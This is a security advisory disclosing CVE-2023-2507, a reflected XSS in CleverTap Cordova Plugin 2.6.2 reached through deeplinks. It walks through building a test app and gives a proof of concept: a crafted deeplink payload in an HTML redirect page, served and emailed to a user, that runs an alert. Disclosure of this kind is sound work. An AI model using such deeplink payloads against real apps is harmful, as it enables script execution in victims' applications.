---
slug: advisories/maiden/
title: CleverTap Cordova Plugin 2.6.2 - Reflected XSS
authors: Adrian Castañeda
writer: acastañeda 
codename: maiden
product: CleverTap Cordova Plugin v2.6.2
date: 2023-07-14 12:00 COT
cveid: CVE-2023-2507
severity: 9.3
description: CleverTap Cordova Plugin v2.6.2  -   Reflected XSS
keywords: Fluid Attacks, Security, Vulnerabilities, Clever Tap Cordova Plugin, Reflected Xss
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                                                |
| --------------------- | -------------------------------------------------------------------------------|
| **Name**              | CleverTap Cordova Plugin 2.6.2 - Reflected XSS                                 |
| **Code name**         | [Maiden](https://en.wikipedia.org/wiki/Iron_Maiden)                            |
| **Product**           | CleverTap Cordova Plugin                                                       |
| **Affected versions** | 2.6.2                                                                          |
| **State**             | Public                                                                         |
| **Release Date**      | 2023-07-14                                                                     |

## Vulnerability

|                       |                                                                                                        |
| --------------------- | -------------------------------------------------------------------------------------------------------|
| **Kind**              | Reflected cross-site scripting (XSS)                                                                   |
| **Rule**              | [008. Reflected cross-site scripting (XSS)](https://docs.fluidattacks.com/criteria/vulnerabilities/008)|
| **Remote**            | Yes                                                                                                    |
| **CVSSv3 Vector**     | CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N                                                           |
| **CVSSv3 Base Score** | 9.3                                                                                                    |
| **Exploit available** | Yes                                                                                                    |
| **CVE ID(s)**         | [CVE-2023-2507](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2507)                          |

## Description

CleverTap Cordova Plugin version 2.6.2 allows a remote attacker to
execute JavaScript code in any application that is opened via a
specially constructed deeplink by an attacker.

This is possible because the plugin does not correctly validate the
data coming from the deeplinks before using them.

## Vulnerability

This vulnerability occurs because the the plugin does not correctly
validate the data coming from the deeplinks before using them.

## Exploitation requirements

In order to exploit the plugin, first we need a application that use the
plugin.

### How to Create an application that uses the plugin

1. Install [Cordova](https://cordova.apache.org/docs/en/11.x/guide/cli/).

```bash
sudo npm install -g cordova
```

2. Create a new project with Cordova.

```bash
cordova create fluidpoc com.example.fluidpoc HelloPOC
```

3. Inside the directory of the new project we add the Android platform.

```bash
cordova platform add android
```

![image](https://user-images.githubusercontent.com/53542055/253701737-02de4e23-89ea-4b02-9ea2-2e1cad87c97f.png)

4. We compile the project to verify that everything is OK.

```bash
cordova build
```

![image](https://user-images.githubusercontent.com/53542055/253701744-326fe269-cbc3-41df-8eb0-076a1070c246.png)

We also checked that the application runs correctly on a cell phone.

![image](https://user-images.githubusercontent.com/53542055/253701749-642b9dc2-353a-44f8-b57a-ab5508e5118b.png)

Everything is working fine!

5. Now we add the CleverTap Cordova Plugin following the
   [instructions](https://rb.gy/e39s2) in the project
   repository.

```bash
cordova plugin add https://github.com/CleverTap/clevertap-cordova.git --variable CLEVERTAP_ACCOUNT_ID="YOUR CLEVERTAP ACCOUNT ID" --variable CLEVERTAP_TOKEN="YOUR CELVERTAP ACCOUNT TOKEN"
```

![image](https://user-images.githubusercontent.com/53542055/253701755-4d90475d-5419-496b-870e-c2c7832b5e30.png)

With this we have the latest version of the plugin in our test application.

![image](https://user-images.githubusercontent.com/53542055/253701775-1e76058d-9d35-48d8-b5f4-612eeb502384.png)

6. Now we must replace the content of the `www/js/index.js`
  file with the [example](https://rb.gy/dz2rs) presented in the
  [repository](https://github.com/CleverTap/clevertap-cordova/tree/master)
  of the plugin.

![image](https://user-images.githubusercontent.com/53542055/253701779-bd2bf07e-6fc9-4d44-9508-8d71c161f5db.png)

7. In the Androidmanifest
   `platforms/android/app/src/main/AndroidManifest.xml`
   add an intent-filter like the following in the
  `MainActivity`:

```xml
<intent-filter android:label="@string/app_name">
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="fluidpoc" />
</intent-filter>
```

![image](https://user-images.githubusercontent.com/53542055/253701802-bfe25f09-e0b5-4fdb-ab2c-d857959f5eda.png)

8. Finally compile the application and install it
   on an Android device or emulator.

```bash
cordova build
```

![image](https://user-images.githubusercontent.com/53542055/253701810-a3d88563-9e52-45de-b275-22dcfa954de0.png)

![image](https://user-images.githubusercontent.com/53542055/253701816-eb20dce5-48a5-4b07-8fb9-ea1fc2e73c15.png)

## Exploitation

1. When having an application that uses the vulnerable plugin.
   The application must have an [*intent-filter*](https://rb.gy/7vjqr)
   similar to the following:

```xml
<intent-filter android:label="@string/app_name">
    <action android:name="android.intent.action.VIEW" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
    <data android:scheme="fluidpoc" />
</intent-filter>
```

2. We create a malicious deeplink (payload) to exploit the
   vulnerability.

```txt
fluidpoc://fluid/'});alert('Fluid Attacks POC',{1:'a
```

3. In a directory create the file `index.html` with the
   following content in which is included our
   "malicious deeplink".

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
  <script>
    location.href = "fluidpoc://fluid/'});alert('Fluid Attacks POC',{1:'a";
  </script>
</body>
</html>
```

4. On an http server expose the file created above.
   In this case, the exposed http server is only
  accessible from my own local network, so it can
  only be accessed by devices that are on this same
  network.

```bash
python3 -m http.server
```

![image](https://user-images.githubusercontent.com/53542055/253701823-3a9178a4-2b16-4606-b43a-bbff31ece1bd.png)

5. Then we send the link to the http server that
   exposes the file we created to the user via email.

![image](https://user-images.githubusercontent.com/53542055/253701826-674bb3de-b031-42a5-9e41-3e6690b61696.png)

![image](https://user-images.githubusercontent.com/53542055/253701831-454edcb2-0748-48cc-9094-a77c327312d7.png)

6. On a device on the same network as the exposed http
   server, if the user clicks on `click me`, the "HelloPOC"
   application that uses the plugin will be opened and will
   execute JavaScript code that displays an alert to the user
   with the text "Fluid Attacks POC".

![image](https://user-images.githubusercontent.com/53542055/253701839-b48049be-b7ff-418c-badd-f85eb74de53b.png)

![image](https://user-images.githubusercontent.com/53542055/253701844-7285e191-b020-4872-8742-396c577f6258.png)

## Evidence of exploitation

![poc-xss-clever](https://user-images.githubusercontent.com/53542055/253702682-6cf25a6e-10c3-401a-a82f-d18973118806.gif)

## Our security policy

We have reserved the CVE-2023-2507 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: CleverTap Cordova Plugin 2.6.2

* Operating System: Android API 33

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by
[Adrian Castañeda](https://www.linkedin.com/in/adrian-felipe-casta%C3%B1eda-nohava-6a091b180/)
from Fluid Attacks' Offensive Team.

## References

**Vendor page** <https://github.com/CleverTap/clevertap-cordova>

## Timeline

<time-lapse
  discovered="2023-06-19"
  contacted="2023-06-20"
  confirmed="2023-06-23"
  patched=""
  disclosure="2023-07-14">
</time-lapse>